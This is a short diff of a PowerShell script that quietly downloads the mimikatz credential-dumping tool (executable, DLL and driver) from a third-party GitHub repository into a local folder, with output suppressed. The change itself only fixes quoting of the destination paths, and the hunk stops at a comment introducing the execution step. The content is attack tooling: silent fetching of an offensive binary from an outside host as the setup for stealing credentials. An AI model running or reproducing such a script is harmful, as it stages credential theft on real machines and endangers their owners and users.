@@ -10,9 +10,9 @@ $mimikatz_path = "$repo_path/mimikatz"
 
 # Downloading And extracting mimikatz
 #(new-object System.net.WebClient).DownloadFile("https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20171220/mimikatz_trunk.zip", $mimikatz_path/) > $null 2>&1 
-(new-object System.net.WebClient).DownloadFile("https://github.com/projetcybersecurite/ok/blob/master/mimikatz.exe?raw=true", $mimikatz_path/mimikatz.exe) > $null 2>&1 
-(new-object System.net.WebClient).DownloadFile("https://github.com/projetcybersecurite/ok/blob/master/mimilib.dll?raw=true", $mimikatz_path/mimilib.dll) > $null 2>&1 
-(new-object System.net.WebClient).DownloadFile("https://github.com/projetcybersecurite/ok/blob/master/mimidrv.sys?raw=true", $mimikatz_path/mimidrv.sys) > $null 2>&1 
+(new-object System.net.WebClient).DownloadFile("https://github.com/projetcybersecurite/ok/blob/master/mimikatz.exe?raw=true", "$mimikatz_path/mimikatz.exe") > $null 2>&1 
+(new-object System.net.WebClient).DownloadFile("https://github.com/projetcybersecurite/ok/blob/master/mimilib.dll?raw=true", "$mimikatz_path/mimilib.dll") > $null 2>&1 
+(new-object System.net.WebClient).DownloadFile("https://github.com/projetcybersecurite/ok/blob/master/mimidrv.sys?raw=true", "$mimikatz_path/mimidrv.sys") > $null 2>&1 
 #[io.compression.zipfile]::ExtractToDirectory($mimikatz_zip_path, $mimikatz_path) > $null 2>&1 
 
 # Executing
